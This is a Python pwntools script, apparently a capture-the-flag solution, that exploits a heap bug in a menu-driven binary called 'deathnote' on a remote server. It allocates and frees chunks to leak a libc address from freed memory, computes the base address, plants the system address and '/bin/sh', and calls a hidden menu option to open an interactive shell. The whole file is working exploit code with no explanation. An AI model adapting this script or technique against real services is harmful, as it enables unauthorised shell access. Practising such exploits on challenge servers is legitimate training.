from pwn import *
context.log_level = 'debug'

def exploit():
    context.binary = ELF('./deathnote', checksec=False)
    libc = ELF('./glibc/libc.so.6', checksec=False)
    prompt = b'\xf0\x9f\x92\x80\x20'
    #p = process("./deathnote")
    p = remote('94.237.62.195', 49458)
    def add(ix, size, content):
        p.recvuntil(prompt)
        p.sendline(b'1')
        p.sendlineafter(prompt, str(size).encode())
        p.sendlineafter(prompt, str(ix).encode())
        p.sendlineafter(prompt, content)
    
    def delete(ix):
        p.recvuntil(prompt)
        p.sendline(b'2')
        p.sendlineafter(prompt, str(ix).encode())

    def show(ix):
        p.recvuntil(prompt)
        p.sendline(b'3')
        p.sendlineafter(prompt, str(ix).encode())
        p.recvuntil(b'Page content: ')
        return p.recvline()
    
    for i in range(10):
        add(i, 0x80, b'A' * 0x10)
    for i in range(10):
        delete(i)
    
    leak = show(7)
    libc.address = u64(leak[:-1].ljust(8, b'\x00')) - 0x21ace0
    add(0, 0x80, hex(libc.sym['system']).encode())
    add(1, 0x80, b'/bin/sh\x00')
    p.recvuntil(prompt)
    p.sendline(b'42')
    p.interactive()

if __name__ == '__main__':
    exploit()